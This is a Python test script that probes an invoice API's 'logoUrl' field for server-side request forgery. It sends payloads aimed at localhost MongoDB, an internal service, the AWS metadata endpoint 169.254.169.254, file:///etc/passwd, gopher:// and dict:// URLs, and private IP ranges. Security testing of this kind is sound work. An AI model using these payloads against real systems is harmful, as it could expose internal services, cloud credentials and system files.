import requests
import json
import os
import sys
import time
from base64 import b64encode

# Configuration
API_URL = "http://10.0.0.105:3001"  # Docker host IP
TEST_INVOICE = {
    "client": {
        "name": "Test Client",
        "city": "Test City",
        "address": "Test Address",
        "phone": "1234567890",
        "email": "test@example.com"
    },
    "seller": {
        "name": "Test Seller",
        "city": "Test City",
        "address": "Test Address",
        "phone": "1234567890",
        "email": "test@example.com"
    },
    "invoice": {
        "invoiceId": "SSRF-TEST-001",
        "issueDate": "2024-01-01",
        "dueDate": "2024-02-01",
        "currency": "USD",
        "taxValue": 10,
        "amountPaid": 0,
        "terms": "Net 30",
        "items": [
            {
                "description": "Test Item",
                "quantity": 1,
                "unitPrice": 100
            }
        ]
    }
}

def login():
    """Login and get JWT token."""
    response = requests.post(f"{API_URL}/api/auth/login", json={
        "username": "test",
        "password": "test123"
    })
    assert response.status_code == 200, "Login failed"
    return response.json()["token"]

def test_invoice_local_logo():
    """Test invoice creation with local logo."""
    token = login()
    
    # Create test data with base64 logo
    test_data = TEST_INVOICE.copy()
    test_data["invoice"]["logo"] = "data:image/png;base64," + b64encode(b"test").decode()
    
    response = requests.post(
        f"{API_URL}/api/invoice",
        json=test_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200, "Invoice creation failed"
    # Response is the invoice object itself
    assert response.json()["invoiceId"] == "SSRF-TEST-001", "Invoice ID mismatch"

def test_invoice_remote_logo():
    """Test invoice creation with remote logo."""
    token = login()
    
    # Create test data with remote logo
    test_data = TEST_INVOICE.copy()
    test_data["invoice"]["logoUrl"] = "http://example.com/logo.png"
    
    response = requests.post(
        f"{API_URL}/api/invoice",
        json=test_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200, "Invoice creation failed"
    # Response is the invoice object itself
    assert response.json()["invoiceId"] == "SSRF-TEST-001", "Invoice ID mismatch"

def test_ssrf_internal_network():
    """Test SSRF vulnerability with internal network access."""
    token = login()
    
    # Test MongoDB access
    test_data = TEST_INVOICE.copy()
    test_data["invoice"]["logoUrl"] = "http://localhost:27017"
    
    response = requests.post(
        f"{API_URL}/api/invoice",
        json=test_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200, "MongoDB SSRF test failed"
    assert response.json()["invoiceId"] == "SSRF-TEST-001", "Invoice ID mismatch"

    # Test internal service
    test_data["invoice"]["logoUrl"] = "http://internal-service:8080"
    response = requests.post(
        f"{API_URL}/api/invoice",
        json=test_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200, "Internal service SSRF test failed"
    assert response.json()["invoiceId"] == "SSRF-TEST-001", "Invoice ID mismatch"

def test_ssrf_cloud_metadata():
    """Test SSRF vulnerability with cloud metadata access."""
    token = login()
    
    # Test AWS metadata
    test_data = TEST_INVOICE.copy()
    test_data["invoice"]["logoUrl"] = "http://169.254.169.254/latest/meta-data/"
    
    response = requests.post(
        f"{API_URL}/api/invoice",
        json=test_data,
        headers={"Authorization": f"Bearer {token}"}
    )
    assert response.status_code == 200, "AWS metadata SSRF test failed"
    assert response.json()["invoiceId"] == "SSRF-TEST-001", "Invoice ID mismatch"

def test_ssrf_protocols():
    """Test SSRF vulnerability with different protocols."""
    token = login()
    
    protocols = [
        "file:///etc/passwd",
        "gopher://localhost:3001/_GET",
        "dict://localhost:11211/stats"
    ]
    
    for protocol in protocols:
        test_data = TEST_INVOICE.copy()
        test_data["invoice"]["logoUrl"] = protocol
        
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {token}"}
        )
        assert response.status_code in [200, 500], f"Protocol test failed for {protocol}"
        if response.status_code == 200:
            assert response.json()["invoiceId"] == "SSRF-TEST-001", "Invoice ID mismatch"

def test_ssrf_ip_ranges():
    """Test SSRF vulnerability with different IP ranges."""
    token = login()
    
    ip_ranges = [
        "127.0.0.1",
        "192.168.0.1",
        "10.0.0.1",
        "172.16.0.1",
        "localhost"
    ]
    
    for ip in ip_ranges:
        test_data = TEST_INVOICE.copy()
        test_data["invoice"]["logoUrl"] = f"http://{ip}"
        
        response = requests.post(
            f"{API_URL}/api/invoice",
            json=test_data,
            headers={"Authorization": f"Bearer {token}"}
        )
        assert response.status_code in [200, 500], f"IP range test failed for {ip}"
        if response.status_code == 200:
            assert response.json()["invoiceId"] == "SSRF-TEST-001", "Invoice ID mismatch"

def register():
    """Register a test user if it doesn't exist."""
    try:
        response = requests.post(f"{API_URL}/api/auth/register", json={
            "username": "test",
            "password": "test123"
        })
        if response.status_code == 200:
            print("✅ Test user registered")
        else:
            print("ℹ️ User already exists")
    except Exception as e:
        print("ℹ️ User registration failed, proceeding with login")

def main():
    """Run all tests."""
    print("Starting SSRF vulnerability tests...")
    
    try:
        # Try to register test user
        register()
        
        test_invoice_local_logo()
        print("✅ Local logo test passed")
        
        test_invoice_remote_logo()
        print("✅ Remote logo test passed")
        
        test_ssrf_internal_network()
        print("✅ Internal network SSRF test passed")
        
        test_ssrf_cloud_metadata()
        print("✅ Cloud metadata SSRF test passed")
        
        test_ssrf_protocols()
        print("✅ Protocol SSRF test passed")
        
        test_ssrf_ip_ranges()
        print("✅ IP range SSRF test passed")
        
        print("\nAll tests passed successfully! 🎉")
        return 0
        
    except AssertionError as e:
        print(f"\n❌ Test failed: {str(e)}")
        return 1
    except Exception as e:
        print(f"\n❌ Unexpected error: {str(e)}")
        return 1

if __name__ == "__main__":
    sys.exit(main()) 